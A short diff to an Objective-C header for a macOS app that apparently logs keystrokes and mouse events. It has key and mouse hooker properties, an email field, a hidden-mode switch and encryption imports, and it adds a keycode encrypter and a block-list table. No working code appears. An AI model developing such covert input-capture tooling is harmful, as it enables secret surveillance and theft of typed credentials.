@@ -16,8 +16,10 @@
 #import "FileManager.h"
 #import "RegexManager.h"
 #import "Cryptographer.h"
+#import "BlockItem.h"
+#import "KeycodeEncrypter.h"
 
-@interface ViewController : NSViewController<NSTextFieldDelegate>
+@interface ViewController : NSViewController<NSTextFieldDelegate, NSTableViewDelegate, NSTableViewDataSource>
 
 {
     BOOL emailFlag;
@@ -27,9 +29,17 @@
 @property KeyHooker *key;
 @property MouseHooker *mouse;
 
+@property BOOL pressAddFlag;
+@property NSMutableArray<BlockItem*> *buttonsBlockArray;
+@property NSInteger start;
+@property NSInteger index;
+
 @property (weak) IBOutlet NSTextField *emailTextField;
 @property (weak) IBOutlet NSTextField *fileSize;
 @property (weak) IBOutlet NSButton *hiddenModeSwitch;
 @property (weak) IBOutlet NSButton *saveButton;
+@property (weak) IBOutlet NSButton *addBlockButton;
+
+@property (weak) IBOutlet NSTableView *tableView;
 
 @end
